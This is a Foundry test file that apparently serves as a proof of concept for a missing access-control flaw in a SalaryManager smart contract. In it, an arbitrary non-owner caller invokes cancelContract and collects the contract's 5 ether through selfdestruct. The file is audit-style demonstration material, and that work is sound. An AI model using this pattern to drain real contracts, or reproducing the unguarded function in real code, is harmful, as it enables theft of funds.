
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager salaryManager;

    function setUp() public {
        salaryManager = new SalaryManager();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != address(salaryManager));

        // Fund the contract so that address(this) (the owner) has deposited some ether
        vm.deal(address(this), 10 ether);
        (bool ok, ) = address(salaryManager).call{value: 5 ether}("");
        require(ok, "funding failed");

        // Ensure the invariant required by cancelContract holds:
        // _totalAllocated is 0 initially, so we just need contract balance > 0
        assertGt(address(salaryManager).balance, 0);

        // Switch context to arbitrary caller (not owner)
        vm.prank(caller);

        // Vulnerable call: no access control on cancelContract
        salaryManager.cancelContract();

        // Assert that the caller received the contract balance via selfdestruct
        assertEq(caller.balance, 5 ether);
    }
}
